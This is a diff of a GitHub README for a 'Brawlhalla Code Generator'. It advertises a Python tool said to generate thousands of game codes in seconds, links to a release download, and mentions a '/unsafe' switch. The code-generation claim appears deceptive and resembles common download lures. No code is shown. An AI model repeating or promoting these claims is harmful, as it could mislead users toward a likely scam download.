@@ -1,4 +1,6 @@
-<p align="center"> ## Brawlhalla Code Generator ##
+<p align="center">
+    # Brawl
+</p>
 
 ## About: ##
 A Brawlhalla code generator The first of it's kind that generates thousands of codes in seconds! Feel free to use it and improve it. If you do don't forget to leave credit behind.
@@ -15,8 +17,25 @@ Brawlgen is recommended if you wan't to generate codes fast and safe.
 * Download useful improved beta versions that are made by co-developers		
 		
 ## Downloads: ##
-<p align="center">
-	<a href="https://github.com/Aysur/Brawlhalla-Code-Generator/archive/refs/tags/Download.zip" target="_blank">
-		<img src="images/download-button (2).png">
-		<p align="center">
-	https://github.com/Aysur/Brawlhalla-Code-Generator/releases
+https://github.com/Aysur/Brawlhalla-Code-Generator/releases
+
+## Compatibility: ##
+
+* Python
+* Compatible with Windows 7, 8, 8.1, 10, 11
+* Can run under Windows Server 2008, 2012, 2016, 2019, 2022 using /unsafe switch
+
+## Tools used: ##
+* Visual Studio Code
+* Python
+
+## Credits to co-developers: ##
+* Zardex
+
+## Details: ##
+
+* Latest version: Downloads
+* Released: April 5, 2022
+	
+
+## Thanks for this really tiny, yet extremely useful libary ##
